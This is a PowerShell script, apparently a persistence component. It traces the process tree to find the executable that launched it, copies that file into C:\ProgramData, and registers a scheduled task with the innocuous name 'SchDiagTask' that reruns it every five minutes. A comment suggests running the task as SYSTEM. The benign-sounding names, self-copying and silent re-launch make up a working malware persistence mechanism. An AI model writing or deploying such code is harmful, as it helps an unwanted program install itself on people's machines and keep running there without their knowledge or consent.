# checker.ps1 (rewritten)
# Behavior:
# 1) If "SchDiagTask" exists -> exit
# 2) Else find the originating EXE that launched this script
# 3) If needed, search C:\ for that EXE
# 4) Copy it to C:\ProgramData\<exeName>
# 5) Create "SchDiagTask" to run every 5 minutes

$taskName = 'SchDiagTask'
$destDir  = 'C:\ProgramData'

function Write-Info($m){ Write-Host "[*] $m" -ForegroundColor Cyan }
function Write-Good($m){ Write-Host "[+] $m" -ForegroundColor Green }
function Write-Warn($m){ Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err($m) { Write-Host "[-] $m" -ForegroundColor Red }

function Test-TaskExists {
    param([Parameter(Mandatory)][string]$Name)
    # Try the ScheduledTasks module first (quiet)
    $t = Get-ScheduledTask -TaskName $Name -ErrorAction SilentlyContinue
    if ($t) { return $true }

    # Fallback to schtasks without throwing on stderr
    $prev = $ErrorActionPreference
    try {
        $ErrorActionPreference = 'Continue'
        $null = & cmd /c "schtasks /Query /TN `"$Name`"" 2>&1 | Out-Null
        return (${LASTEXITCODE} -eq 0)
    } finally {
        $ErrorActionPreference = $prev
    }
}

function Get-OriginatingProcess {
    param(
        [int]$StartPid = $PID,
        [string[]]$SkipNames = @('powershell','pwsh','cmd','conhost','wscript','cscript','explorer')
    )
    $currentPid = $StartPid
    while ($true) {
        $proc = Get-CimInstance Win32_Process -Filter "ProcessId=$currentPid" -ErrorAction SilentlyContinue
        if (-not $proc) { return $null }

        $ppid = [int]$proc.ParentProcessId
        if ($ppid -eq 0) { return $proc } # Top

        $parent = Get-CimInstance Win32_Process -Filter "ProcessId=$ppid" -ErrorAction SilentlyContinue
        if (-not $parent) { return $proc }

        $nameSans = ($parent.Name -replace '\.exe$','').ToLower()
        if ($nameSans -and ($SkipNames -notcontains $nameSans)) {
            return $parent
        }
        $currentPid = $ppid
    }
}

function Find-ExeOnDisk {
    param(
        [Parameter(Mandatory)][string]$ExeName,
        [string]$Root = 'C:\'
    )
    Write-Info "Searching $Root for $ExeName ..."
    $match = Get-ChildItem -Path $Root -Recurse -File -Force -Filter $ExeName -ErrorAction SilentlyContinue |
             Select-Object -First 1
    if ($match) { return $match.FullName }
    return $null
}

# --- Main ---
if (Test-TaskExists -Name $taskName) {
    Write-Good "Scheduled task '$taskName' already exists. Exiting."
    return
}

Write-Info "Scheduled task '$taskName' not found. Determining originating EXE..."

$origin = Get-OriginatingProcess
if (-not $origin) {
    Write-Err "Could not determine originating process. Exiting."
    return
}

$originExePath = $origin.ExecutablePath
$originExeName = if ($originExePath) { [System.IO.Path]::GetFileName($originExePath) } else { $origin.Name }
Write-Info "Origin process: $($origin.Name) (PID $($origin.ProcessId))"
Write-Info "ExecutablePath: $originExePath"
Write-Info "Exe to deploy:  $originExeName"

# Resolve source path (use known path if readable; else search C:\)
$sourcePath = $null
if ($originExePath -and (Test-Path -LiteralPath $originExePath)) {
    $sourcePath = $originExePath
} else {
    $sourcePath = Find-ExeOnDisk -ExeName $originExeName -Root 'C:\'
    if (-not $sourcePath) {
        Write-Err "Could not find $originExeName anywhere under C:\. Exiting."
        return
    }
    Write-Good "Found at: $sourcePath"
}

# Ensure destination and copy
try {
    if (-not (Test-Path $destDir)) {
        Write-Info "Creating destination dir: $destDir"
        New-Item -Path $destDir -ItemType Directory -Force | Out-Null
    }
    $destPath = Join-Path $destDir $originExeName
    Copy-Item -LiteralPath $sourcePath -Destination $destPath -Force
    Write-Good "Copied to: $destPath"
} catch {
    Write-Err "Copy failed: $($_.Exception.Message). Try running as Administrator."
    return
}

# Create the scheduled task (every 5 minutes)
$quotedDest = "`"$destPath`""
# Add /RU SYSTEM if you want it to run as SYSTEM (requires Admin)
$createCmd  = "schtasks /Create /TN `"$taskName`" /SC MINUTE /MO 5 /TR $quotedDest /F"
Write-Info  "Creating scheduled task '$taskName' (every 5 minutes)..."
$createOut  = & cmd /c $createCmd 2>&1
if (${LASTEXITCODE} -ne 0) {
    Write-Err ("schtasks failed with exit code {0}." -f ${LASTEXITCODE})
    $createOut | ForEach-Object { Write-Err $_ }
    return
}
Write-Good "Scheduled task '$taskName' created."

# Verify (best-effort)
try {
    $t = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($t) {
        Write-Info "Task action:"
        $t.Actions | ForEach-Object { Write-Host "  Execute: $($_.Execute) ; Arguments: $($_.Arguments)" }
    } else {
        $q = & cmd /c "schtasks /Query /TN `"$taskName`" /V /FO LIST" 2>&1
        if (${LASTEXITCODE} -eq 0) {
            Write-Good "Verified task exists via schtasks."
        }
    }
} catch { }

Write-Host "`nDone.`n"
